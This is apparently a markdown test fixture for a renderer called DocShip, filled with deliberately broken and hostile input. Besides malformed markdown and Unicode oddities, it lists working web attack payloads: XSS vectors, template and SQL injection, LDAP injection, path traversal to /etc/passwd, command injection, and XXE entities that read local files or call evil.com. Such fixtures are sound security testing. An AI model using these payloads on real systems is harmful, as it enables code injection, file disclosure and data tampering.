> ⚠️ **This is a test file for DocShip development. The content below is intentionally broken.**

# Extreme Edge Cases Test

## Null Bytes and Control Characters

Here's text with hidden characters: ​​​​​​​​​​

## Deeply Nested Brackets

[[[[[[[[[[nested]]]]]]]]]]

((((((((((nested))))))))))

{{{{{{{{{{nested}}}}}}}}}}

[[[[link](url)](url)](url)](url)

## Recursive Markdown

**bold *italic **bold again** italic* bold**

***bold italic***bold italic*****

~~strike **bold ~~nested strike~~** strike~~

## Malformed Front Matter

---
title: "unclosed quote
tags: [unclosed, array
nested:
  - item1
  - 
    broken: true
---

---
: no key
key:
another: missing value
---

## Injection Attempts

<img src="x" onerror="alert('xss')">
<svg onload="alert('xss')">
<body onpageshow="alert('xss')">
<input onfocus="alert('xss')" autofocus>
<marquee onstart="alert('xss')">
<video><source onerror="alert('xss')">
<audio src="x" onerror="alert('xss')">
<iframe src="javascript:alert('xss')">
<object data="javascript:alert('xss')">
<embed src="javascript:alert('xss')">
<form action="javascript:alert('xss')"><input type="submit">
<a href="javascript:alert('xss')">click</a>
<a href="data:text/html,<script>alert('xss')</script>">click</a>
<a href="vbscript:alert('xss')">click</a>

## Protocol Handlers

[file link](file:///etc/passwd)
[ftp link](ftp://server/file)
[mailto](mailto:test@test.com?subject=<script>alert('xss')</script>)
[tel](tel:+1234567890)
[sms](sms:+1234567890)
[data uri](data:text/html,<script>alert(1)</script>)

## Unicode Exploits

<!-- Direction override -->
‮reversed text‬

<!-- Homograph attack -->
аdmin (Cyrillic 'а')
pаypal (Cyrillic 'а')

<!-- Zero-width characters -->
te​xt (zero-width space)
te‌xt (zero-width non-joiner)
te‍xt (zero-width joiner)

<!-- Combining characters -->
ẗ̷̨̛̮̙͓́̌̈́̊̕ḩ̸̛̱̦̈́̌̈́̊̕į̷̛̮̙͓̈́̌̈́̊̕s̸̛̱̦̈́̌̈́̊̕ (zalgo text)

<!-- Byte order marks -->
BOM at start

## Extremely Long Content

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

## Path Traversal in Links

[parent](../../../etc/passwd)
[parent](....//....//etc/passwd)
[encoded](..%2F..%2F..%2Fetc%2Fpasswd)
[double encoded](..%252F..%252Fetc%252Fpasswd)
![image](../../../etc/passwd)

## CRLF Injection

Header: value
Injected-Header: malicious

Set-Cookie: session=hijacked

## Template Injection

${7*7}
${constructor.constructor('return this')()}
#{7*7}
@{7*7}
${{7*7}}
*{7*7}

<%=7*7%>
<%7*7%>
<%= system('id') %>

{{constructor.constructor('return this')()}}
{{config}}
{{self.__class__.__mro__[2].__subclasses__()}}

{php}echo 'test';{/php}
{literal}<script>alert('xss')</script>{/literal}

## Server-Side Include

<!--#exec cmd="ls" -->
<!--#include virtual="/etc/passwd" -->
<!--#echo var="DOCUMENT_ROOT" -->

## Entity Encoding Bypass

<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>

## Broken Encoding

Invalid UTF-8: ���
Latin-1 in UTF-8: café encoded wrong
Mixed encodings: 日本語 mixed with Ã©

## Regex DoS Patterns

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!

## Null in Strings

text\x00text
text%00text

## Format String

%s%s%s%s%s%s%s%s%s%s
%x%x%x%x%x%x%x%x%x%x
%n%n%n%n%n%n%n%n%n%n
%d%d%d%d%d%d%d%d%d%d

## Command Injection Patterns

$(whoami)
`whoami`
| ls
; ls
& ls
|| ls
&& ls
> /tmp/test
< /etc/passwd
$(cat /etc/passwd)

## SQL-like Patterns

' OR '1'='1
" OR "1"="1
'; DROP TABLE users; --
UNION SELECT * FROM users
1; UPDATE users SET admin=1

## LDAP Injection

*)(uid=*))(|(uid=*
admin)(&)
admin)(|(password=*))

## XML/XXE Patterns

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]>

## JSON in Markdown

{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}

## Prototype Pollution

__proto__[admin]=1
constructor[prototype][admin]=1
__proto__.admin=1

## End

If you see this, the file rendered without crashing.
